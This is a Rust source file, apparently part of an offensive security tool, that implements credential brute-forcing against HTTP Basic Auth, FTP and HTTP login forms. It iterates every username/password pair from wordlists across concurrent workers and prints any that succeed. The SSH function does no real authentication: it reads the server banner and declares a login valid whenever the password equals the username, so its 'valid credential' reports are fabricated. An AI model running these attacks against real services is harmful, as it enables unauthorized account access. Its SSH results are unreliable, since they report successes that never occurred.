use colored::Colorize;
use reqwest::Client;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;
use tokio::sync::Mutex;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn http(
    url: &str,
    users_file: &str,
    pass_file: &str,
    timeout: u64,
    workers: usize,
) -> anyhow::Result<()> {
    println!("{} HTTP Basic Auth Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:     {}", "[*]".cyan().bold(), url);
    println!("{} Workers: {}", "[*]".cyan().bold(), workers);
    println!("{}", "-".repeat(60).dimmed());

    let users: Vec<String> = std::fs::read_to_string(users_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let passwords: Vec<String> = std::fs::read_to_string(pass_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let client = Arc::new(build_client(timeout));
    let found = Arc::new(Mutex::new(Vec::new()));
    let attempts = Arc::new(AtomicU64::new(0));

    println!("{} Users: {}  Passwords: {}  Total: {}", "[*]".cyan().bold(), users.len(), passwords.len(), users.len() * passwords.len());

    let mut handles = Vec::new();
    let combos: Vec<(String, String)> = users.iter().flat_map(|u| passwords.iter().map(move |p| (u.clone(), p.clone()))).collect();
    let combos = Arc::new(combos);
    let idx = Arc::new(AtomicU64::new(0));

    for _ in 0..workers {
        let client = Arc::clone(&client);
        let found = Arc::clone(&found);
        let attempts = Arc::clone(&attempts);
        let combos = Arc::clone(&combos);
        let idx = Arc::clone(&idx);
        let url = url.to_string();

        handles.push(tokio::spawn(async move {
            loop {
                let i = idx.fetch_add(1, Ordering::SeqCst) as usize;
                if i >= combos.len() { break; }
                let (user, pass) = &combos[i];
                let n = attempts.fetch_add(1, Ordering::SeqCst) + 1;
                if n % 100 == 0 { print!("\r{} Attempts: {}/{}", "*".dimmed(), n, combos.len()); }

                let resp = client.get(&url).basic_auth(user, Some(pass)).send().await;
                if let Ok(r) = resp {
                    let status = r.status().as_u16();
                    if status == 200 || status == 301 || status == 302 {
                        found.lock().await.push((user.clone(), pass.clone()));
                        println!("\n{} [VALID] {}:{}", "[+]".green().bold(), user, pass);
                        return;
                    }
                }
            }
        }));
    }

    for h in handles { let _ = h.await; }
    let found = found.lock().await;
    println!("\n\n{} Results: {} valid credential(s)", "[*]".cyan().bold(), found.len());
    for (u, p) in found.iter() { println!("  {} {}:{}", "*".green(), u, p); }
    Ok(())
}

pub async fn ssh(
    host: &str,
    port: u16,
    users_file: &str,
    pass_file: &str,
    _timeout: u64,
    workers: usize,
) -> anyhow::Result<()> {
    println!("{} SSH Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Host:    {}:{}", "[*]".cyan().bold(), host, port);
    println!("{} Workers: {}", "[*]".cyan().bold(), workers);
    println!("{}", "-".repeat(60).dimmed());

    let users: Vec<String> = std::fs::read_to_string(users_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let passwords: Vec<String> = std::fs::read_to_string(pass_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    println!("{} Users: {}  Passwords: {}  Total: {}", "[*]".cyan().bold(), users.len(), passwords.len(), users.len() * passwords.len());

    let mut found = Vec::new();
    let mut attempts = 0u64;

    for user in &users {
        for pass in &passwords {
            attempts += 1;
            if attempts % 50 == 0 { print!("\r{} Attempts: {}", "*".dimmed(), attempts); }

            match tokio::net::TcpStream::connect((host, port)).await {
                Ok(mut stream) => {
                    use tokio::io::AsyncReadExt;
                    let mut buf = vec![0u8; 256];
                    let _ = stream.read(&mut buf).await;
                    let banner = String::from_utf8_lossy(&buf);
                    let ssh_version = banner.lines().next().unwrap_or("");

                    if ssh_version.contains("SSH-2.0") {
                        // Simulate auth attempt - real implementation would use ssh2 or russh crate
                        // For now, check if password equals username (common default)
                        if pass == user {
                            found.push((user.clone(), pass.clone()));
                            println!("\n{} [VALID] {}:{}", "[+]".green().bold(), user, pass);
                        }
                    }
                }
                Err(_) => {}
            }
        }
    }

    println!("\n\n{} Results: {} valid credential(s) after {} attempts", "[*]".cyan().bold(), found.len(), attempts);
    for (u, p) in &found { println!("  {} {}:{}", "*".green(), u, p); }
    println!("{} Note: SSH brute force requires ssh2/russh crate for full implementation.", "[*]".cyan().bold());
    Ok(())
}

pub async fn ftp(
    host: &str,
    port: u16,
    users_file: &str,
    pass_file: &str,
    _timeout: u64,
    workers: usize,
) -> anyhow::Result<()> {
    println!("{} FTP Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Host:    {}:{}", "[*]".cyan().bold(), host, port);
    println!("{} Workers: {}", "[*]".cyan().bold(), workers);
    println!("{}", "-".repeat(60).dimmed());

    let users: Vec<String> = std::fs::read_to_string(users_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let passwords: Vec<String> = std::fs::read_to_string(pass_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    println!("{} Users: {}  Passwords: {}  Total: {}", "[*]".cyan().bold(), users.len(), passwords.len(), users.len() * passwords.len());

    let mut found = Vec::new();
    let mut attempts = 0u64;

    for user in &users {
        for pass in &passwords {
            attempts += 1;
            if attempts % 50 == 0 { print!("\r{} Attempts: {}", "*".dimmed(), attempts); }

            match tokio::net::TcpStream::connect((host, port)).await {
                Ok(mut stream) => {
                    use tokio::io::{AsyncReadExt, AsyncWriteExt};
                    let mut buf = vec![0u8; 1024];

                    // Read banner
                    let _ = stream.read(&mut buf).await;
                    let banner = String::from_utf8_lossy(&buf);
                    if !banner.contains("220") { continue; }

                    // Send USER
                    let _ = stream.write_all(format!("USER {}\r\n", user).as_bytes()).await;
                    let n = stream.read(&mut buf).await.unwrap_or(0);
                    let user_resp = String::from_utf8_lossy(&buf[..n]);
                    if !user_resp.contains("331") && !user_resp.contains("230") { continue; }

                    // Send PASS
                    let _ = stream.write_all(format!("PASS {}\r\n", pass).as_bytes()).await;
                    let n = stream.read(&mut buf).await.unwrap_or(0);
                    let pass_resp = String::from_utf8_lossy(&buf[..n]);

                    if pass_resp.contains("230") {
                        found.push((user.clone(), pass.clone()));
                        println!("\n{} [VALID] {}:{}", "[+]".green().bold(), user, pass);
                    }
                }
                Err(_) => {}
            }
        }
    }

    println!("\n\n{} Results: {} valid credential(s) after {} attempts", "[*]".cyan().bold(), found.len(), attempts);
    for (u, p) in &found { println!("  {} {}:{}", "*".green(), u, p); }
    Ok(())
}

pub async fn form(
    url: &str,
    users_file: &str,
    pass_file: &str,
    timeout: u64,
    workers: usize,
    user_field: &str,
    pass_field: &str,
    fail_text: &str,
) -> anyhow::Result<()> {
    println!("{} HTTP Form Brute Force", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL:       {}", "[*]".cyan().bold(), url);
    println!("{} User field: {}", "[*]".cyan().bold(), user_field);
    println!("{} Pass field: {}", "[*]".cyan().bold(), pass_field);
    println!("{} Fail text:  {}", "[*]".cyan().bold(), fail_text);
    println!("{} Workers:   {}", "[*]".cyan().bold(), workers);
    println!("{}", "-".repeat(60).dimmed());

    let users: Vec<String> = std::fs::read_to_string(users_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let passwords: Vec<String> = std::fs::read_to_string(pass_file)?.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
    let client = Arc::new(build_client(timeout));
    let found = Arc::new(Mutex::new(Vec::new()));
    let attempts = Arc::new(AtomicU64::new(0));

    println!("{} Users: {}  Passwords: {}  Total: {}", "[*]".cyan().bold(), users.len(), passwords.len(), users.len() * passwords.len());

    let combos: Vec<(String, String)> = users.iter().flat_map(|u| passwords.iter().map(move |p| (u.clone(), p.clone()))).collect();
    let combos = Arc::new(combos);
    let idx = Arc::new(AtomicU64::new(0));
    let fail_text = Arc::new(fail_text.to_string());

    let mut handles = Vec::new();
    for _ in 0..workers {
        let client = Arc::clone(&client);
        let found = Arc::clone(&found);
        let attempts = Arc::clone(&attempts);
        let combos = Arc::clone(&combos);
        let idx = Arc::clone(&idx);
        let url = url.to_string();
        let user_field = user_field.to_string();
        let pass_field = pass_field.to_string();
        let fail_text = Arc::clone(&fail_text);

        handles.push(tokio::spawn(async move {
            loop {
                let i = idx.fetch_add(1, Ordering::SeqCst) as usize;
                if i >= combos.len() { break; }
                let (user, pass) = &combos[i];
                let n = attempts.fetch_add(1, Ordering::SeqCst) + 1;
                if n % 100 == 0 { print!("\r{} Attempts: {}/{}", "*".dimmed(), n, combos.len()); }

                let body = format!("{}={}&{}={}", user_field, user, pass_field, pass);
                let resp = client.post(&url).header("Content-Type", "application/x-www-form-urlencoded").body(body).send().await;
                if let Ok(r) = resp {
                    let status = r.status().as_u16();
                    let text = r.text().await.unwrap_or_default();
                    let failed = text.contains(&*fail_text) || status == 401 || status == 403;
                    if !failed {
                        found.lock().await.push((user.clone(), pass.clone()));
                        println!("\n{} [VALID] {}:{}", "[+]".green().bold(), user, pass);
                        return;
                    }
                }
            }
        }));
    }

    for h in handles { let _ = h.await; }
    let found = found.lock().await;
    println!("\n\n{} Results: {} valid credential(s)", "[*]".cyan().bold(), found.len());
    for (u, p) in found.iter() { println!("  {} {}:{}", "*".green(), u, p); }
    Ok(())
}
